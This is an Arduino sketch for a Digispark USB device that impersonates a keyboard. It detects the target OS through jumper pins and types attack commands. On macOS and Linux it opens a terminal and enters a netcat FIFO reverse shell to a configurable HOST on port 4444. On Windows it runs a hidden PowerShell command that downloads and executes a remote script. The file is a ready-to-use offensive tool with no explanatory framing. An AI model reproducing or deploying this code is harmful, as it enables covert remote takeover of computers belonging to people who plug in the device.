
#include "DigiKeyboard.h"

#define HOST "hostname"

void setup() {

    pinMode(0, INPUT);
    pinMode(1, INPUT);
    pinMode(2, INPUT);
    pinMode(3, INPUT);
    pinMode(4, INPUT);
    pinMode(5, INPUT);

}

int runOnce = 1;

void loop() {

    if (runOnce) {
        runOnce = 0;

        DigiKeyboard.update();
        DigiKeyboard.sendKeyStroke(0);
        DigiKeyboard.delay(500);

        int pin0 = digitalRead(0);
        int pin1 = digitalRead(1);
        int pin2 = digitalRead(2);
        /*int pin3 = digitalRead(3);*/
        /*int pin4 = digitalRead(4);*/
        /*int pin5 = digitalRead(5);*/

        if (pin0 == 0) {
            osx_keyboard(pin2);
        } else if (pin1 == 0) {
            linux_keyboard();
        } else {
            windows_keyboard();
        }
    }

    while (1) {
        DigiKeyboard.delay(1000);
        DigiKeyboard.update();
    }
}

void osx_keyboard(int pin2) 
{
    if (pin2 == 0) {
        DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); //normal
    } else {
        DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_CONTROL_LEFT); //chinese
    }

    DigiKeyboard.delay(100);

    DigiKeyboard.println("terminal");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.println(" nohup $(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "HOST" 4444 >/tmp/f)& exit");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);
}

void windows_keyboard() 
{
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

    DigiKeyboard.delay(300);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.println("cmd");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(300);

    DigiKeyboard.println("powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"http://"HOST":8080/w\"))");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.println("exit");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);
}

void linux_keyboard() 
{
    DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);

    DigiKeyboard.delay(100);

    DigiKeyboard.println("xterm");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.println(" nohup $(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "HOST" 4444 >/tmp/f)& exit");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);

    DigiKeyboard.println("exit");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.delay(100);
}

